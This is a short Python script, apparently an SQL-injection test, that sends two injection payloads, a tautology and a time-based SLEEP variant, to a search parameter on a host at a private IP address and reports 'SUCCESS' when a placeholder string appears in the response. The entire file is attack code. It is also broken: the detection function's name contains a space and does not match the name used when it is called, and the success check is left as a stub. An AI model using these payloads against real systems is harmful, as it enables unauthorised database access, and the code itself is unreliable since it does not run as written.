import requests

# Target URL and payload to test SQL Injection vulnerability
target_url = "http://192.168.2.69:3000/vulnerable?search="
test_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' AND SLEEP(5)-- "
]

def send_request(payload):
    url = f"{target_url}{payload}"
    try:
        response = requests.get(url)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def check_for_success Signal(response):
    if "specific success signal" in response.text:  # Replace with specific success signal
        print("Evidence of SQL Injection vulnerability found!")
        return True
    else:
        return False

def main():
    for payload in test_payloads:
        print(f"Sending request with payload: {payload}")
        response = send_request(payload)
        if response and check_for_success_Signal(response):
            print("RESULT: SUCCESS")
            break
        else:
            print("RESULT: NO_SIGNAL")

if __name__ == "__main__":
    main()